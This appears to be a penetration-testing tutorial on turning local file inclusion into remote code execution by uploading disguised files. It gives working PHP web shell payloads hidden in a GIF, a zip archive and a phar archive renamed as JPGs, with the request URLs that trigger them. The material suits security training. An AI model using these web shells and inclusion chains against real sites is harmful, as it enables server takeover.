# LFI and File Uploads
for the attack we are going to discuss in this section, we do not require the file upload form to be vulnerable, but merely allow us to upload files. If the vulnerable function has code `Execute` capabilities, then the code within the file we upload will get executed if we include it, regardless of the file extension or file type. 

For example, we can upload an image file (e.g. `image.jpg`), and store a PHP web shell code within it 'instead of image data', and if we include it through the LFI vulnerability, the PHP code will get executed and we will have remote code execution.

The following are the functions that allow executing code with file inclusion, any of which would work with this section's attacks:

|**Function**|**Read Content**|**Execute**|**Remote URL**|
|---|:-:|:-:|:-:|
|**PHP**||||
|`include()`/`include_once()`|✅|✅|✅|
|`require()`/`require_once()`|✅|✅|❌|
|**NodeJS**||||
|`res.render()`|✅|✅|❌|
|**Java**||||
|`import`|✅|✅|✅|
|**.NET**||||
|`include`|✅|✅|✅|

## Image upload
The vulnerability, in this case, is not in the file upload form but the file inclusion functionality.
### Crafting Malicious Image
Our first step is to create a malicious image containing a PHP web shell code that still looks and works as an image. 

So, we will use an allowed image extension in our file name (e.g. `shell.gif`), and should also include the image magic bytes at the beginning of the file content (e.g. `GIF8`), just in case the upload form checks for both the extension and content type as well. 

We can do so as follows:
```bash
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```
- This file on its own is completely harmless and would not affect normal web applications in the slightest. However, if we combine it with an LFI vulnerability, then we may be able to reach remote code execution.

> **Note:** We are using a `GIF` image in this case since its magic bytes are easily typed, as they are ASCII characters, while other extensions have magic bytes in binary that we would need to URL encode. However, this attack would work with any allowed image or file type.

Now, we need to upload our malicious image file.
### Uploaded File Path
Once we've uploaded our file, all we need to do is include it through the LFI vulnerability. To include the uploaded file, we need to know the path to our uploaded file.

In our case, if we inspect the source code after uploading the image, we can get its URL:
```html
<img src="/profile_images/shell.gif" class="profile-image" id="profile-image">
```

> **Note:** If we do not know where the file is uploaded, then we can fuzz for an uploads directory, and then fuzz for our uploaded file, though this may not always work as some web applications properly hide the uploaded files.

With the uploaded file path at hand, all we need to do is to include the uploaded file in the LFI vulnerable function, and the PHP code should get executed, as follows:
```html
http://<SERVER_IP>:<PORT>/index.php?language=./profile_images/shell.gif&cmd=id
```
## Zip Upload
There are a couple of other PHP-only techniques that utilize PHP wrappers to achieve the same goal.

We can utilize the [zip](https://www.php.net/manual/en/wrappers.compression.php) wrapper to execute PHP code. However, this wrapper isn't enabled by default.

We can start by creating a PHP web shell script and zipping it into a zip archive (named `shell.jpg`), as follows:
```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
```
> **Note:** Even though we named our zip archive as (shell.jpg), some upload forms may still detect our file as a zip archive through content-type tests and disallow its upload, so this attack has a higher chance of working if the upload of zip archives is allowed.

Once we upload the `shell.jpg` archive, we can include it with the `zip` wrapper as (`zip://shell.jpg`), and then refer to any files within it with `#shell.php` (URL encoded). 

Finally, we can execute commands as we always do with `&cmd=id`, as follows:
```url
http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id
```
## Phar Upload
Finally, we can use the `phar://` wrapper to achieve a similar result. To do so, we will first write the following PHP script into a `shell.php` file:
```php
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

$phar->stopBuffering();
```

This script can be compiled into a `phar` file that when called would write a web shell to a `shell.txt` sub-file, which we can interact with. 

We can compile it into a `phar` file and rename it to `shell.jpg` as follows:
```bash
php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
```

Now, we should have a phar file called `shell.jpg`. Once we upload it to the web application, we can simply call it with `phar://` and provide its URL path, and then specify the phar sub-file with `/shell.txt` (URL encoded) to get the output of the command we specify with (`&cmd=id`), as follows:
```url
http://<SERVER_IP>:<PORT>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
```
